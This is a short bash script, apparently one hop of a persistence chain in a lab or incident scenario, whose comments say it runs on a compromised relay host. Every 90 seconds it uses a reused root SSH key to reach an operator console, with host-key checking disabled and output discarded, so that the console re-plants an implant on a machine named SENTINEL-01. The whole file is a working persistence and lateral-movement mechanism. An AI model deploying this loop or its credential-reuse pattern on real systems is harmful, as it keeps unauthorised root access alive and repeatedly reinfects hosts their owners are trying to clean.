#!/bin/bash
# Relay -> console hop of the re-entry chain. Runs on the compromised relay.
# Every 90 seconds it uses the reused relay key to reach the operator console,
# which in turn re-plants the implant on SENTINEL-01. Miss this path and the
# cluster re-infects itself.
set -u

while true; do
  ssh -i /root/.ssh/relay_reuse \
      -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
      -o ConnectTimeout=5 -o BatchMode=yes \
      root@console /usr/local/sbin/console-sync.sh >/dev/null 2>&1
  sleep 90
done
